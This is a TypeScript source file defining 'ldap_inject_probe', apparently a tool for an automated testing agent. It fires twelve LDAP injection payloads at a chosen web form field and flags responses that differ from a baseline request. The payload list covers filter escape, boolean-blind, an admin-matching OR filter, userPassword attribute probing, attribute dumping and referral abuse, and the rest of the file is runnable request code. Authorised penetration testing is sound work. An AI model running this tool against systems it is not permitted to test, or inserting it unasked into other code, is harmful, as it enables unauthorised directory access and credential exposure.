// T63 — ldap_inject_probe
// LDAP injection: boolean-blind, error-based, and filter-escape payloads.

import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const definition: ToolDefinition = {
  name: 'ldap_inject_probe',
  description:
    'LDAP injection probe. Fires boolean-blind, filter-escape, and objectClass enumeration payloads ' +
    'into the target field. Detects: filter escape (uid=*), boolean-blind (uid=admin)(uid=*), ' +
    'wildcard match (*), attribute enumeration, and referral abuse. Confirms injection via ' +
    'differential response analysis.',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'url',         type: 'string', required: true,  description: 'Target URL' },
    { name: 'method',      type: 'string', required: false, description: 'HTTP method', default: 'POST' },
    { name: 'field',       type: 'string', required: true,  description: 'Vulnerable field name' },
    { name: 'base_value',  type: 'string', required: false, description: 'Baseline field value', default: 'user' },
    { name: 'auth_header', type: 'string', required: false, description: 'Authorization header value' },
    { name: 'headers',     type: 'string', required: false, description: 'JSON extra headers' },
    { name: 'timeout_ms',  type: 'number', required: false, description: 'Per-request timeout ms', default: 10000 },
  ],
};

const LDAP_PAYLOADS = [
  { name: 'wildcard',           payload: '*',                           desc: 'Wildcard match — returns all objects' },
  { name: 'filter_escape',      payload: '*)(&',                        desc: 'Filter escape to inject AND clause' },
  { name: 'boolean_true',       payload: '*)(uid=*',                    desc: 'Boolean true injection — always matches' },
  { name: 'boolean_false',      payload: '*)(uid=genesis_nonexistent',  desc: 'Boolean false injection — should not match' },
  { name: 'admin_filter',       payload: '*)(|(uid=admin',              desc: 'OR filter to match admin user' },
  { name: 'objectclass_enum',   payload: '*)(objectClass=*',            desc: 'objectClass enumeration' },
  { name: 'null_byte',          payload: 'user\x00*',                   desc: 'Null byte injection' },
  { name: 'close_paren',        payload: 'user)',                       desc: 'Close paren — syntax error probe' },
  { name: 'double_paren',       payload: '*))',                         desc: 'Double close paren — unbalanced filter' },
  { name: 'attr_dump',          payload: '*)(cn=*)(!(cn=',              desc: 'Attribute dump via NOT filter' },
  { name: 'password_wildcard',  payload: '*)(userPassword=*',           desc: 'Probe for exposed userPassword attribute' },
  { name: 'referral_abuse',     payload: '*(|(objectClass=referral',    desc: 'LDAP referral abuse attempt' },
];

export const ldapInjectProbeTool = {
  definition,
  async execute(params: Record<string, unknown>, _exec: CommandExecutor): Promise<ToolResult> {
    const url = String(params.url || '');
    const method = String(params.method || 'POST').toUpperCase();
    const field = String(params.field || '');
    const baseValue = String(params.base_value || 'user');
    const timeoutMs = Number(params.timeout_ms || 10000);

    if (!url) return { output: 'url required', parsed: { error: 'missing_url' } };
    if (!field) return { output: 'field required', parsed: { error: 'missing_field' } };

    let headers: Record<string, string> = { 'User-Agent': 'Mozilla/5.0 GENESIS/4.0' };
    try { if (params.headers) Object.assign(headers, JSON.parse(String(params.headers))); } catch { /* ignore */ }
    if (params.auth_header) headers['Authorization'] = String(params.auth_header);

    // Baseline request
    let baselineStatus = 0;
    let baselineLen = 0;
    try {
      const c = new AbortController();
      const t = setTimeout(() => c.abort(), timeoutMs);
      let r: Response;
      if (method === 'GET') {
        const sep = url.includes('?') ? '&' : '?';
        r = await fetch(`${url}${sep}${field}=${encodeURIComponent(baseValue)}`, { headers, signal: c.signal });
      } else {
        r = await fetch(url, { method, headers: { ...headers, 'Content-Type': 'application/x-www-form-urlencoded' }, body: `${field}=${encodeURIComponent(baseValue)}`, signal: c.signal });
      }
      clearTimeout(t);
      baselineStatus = r.status;
      baselineLen = parseInt(r.headers.get('content-length') || '0') || (await r.text()).length;
    } catch { /* ignore */ }

    const results: Array<{ name: string; status: number; body_len: number; interesting: boolean; desc: string; error?: string }> = [];

    for (const p of LDAP_PAYLOADS) {
      try {
        const c = new AbortController();
        const t = setTimeout(() => c.abort(), timeoutMs);
        let r: Response;
        if (method === 'GET') {
          const sep = url.includes('?') ? '&' : '?';
          r = await fetch(`${url}${sep}${field}=${encodeURIComponent(p.payload)}`, { headers, signal: c.signal });
        } else {
          r = await fetch(url, { method, headers: { ...headers, 'Content-Type': 'application/x-www-form-urlencoded' }, body: `${field}=${encodeURIComponent(p.payload)}`, signal: c.signal });
        }
        clearTimeout(t);
        const body = await r.text();
        const bodyLen = body.length;
        // Interesting: status or length diverges significantly from baseline
        const interesting = (r.status !== baselineStatus) || Math.abs(bodyLen - baselineLen) > 50;
        results.push({ name: p.name, status: r.status, body_len: bodyLen, interesting, desc: p.desc });
      } catch (err) {
        results.push({ name: p.name, status: 0, body_len: 0, interesting: false, desc: p.desc, error: String(err) });
      }
    }

    const interesting = results.filter(r => r.interesting);
    const lines = [
      `ldap_inject_probe — ${LDAP_PAYLOADS.length} LDAP injection payloads`,
      `Target: ${url.substring(0, 80)}  field="${field}"`,
      `Baseline: status=${baselineStatus}  body_len=${baselineLen}`,
      `Interesting responses: ${interesting.length}/${results.length}`,
      '─'.repeat(72),
    ];
    for (const r of results) {
      const flag = r.interesting ? '⚡ INTERESTING' : r.error ? '✗ ERR        ' : '  ·          ';
      const delta = r.body_len - baselineLen;
      lines.push(`  ${flag}  [${r.name.padEnd(20)}]  status=${r.status}  len=${r.body_len}(Δ${delta > 0 ? '+' : ''}${delta})  ${r.desc}`);
    }

    return {
      output: lines.join('\n'),
      parsed: { baseline_status: baselineStatus, baseline_len: baselineLen, interesting_count: interesting.length, interesting, results },
    };
  },
};
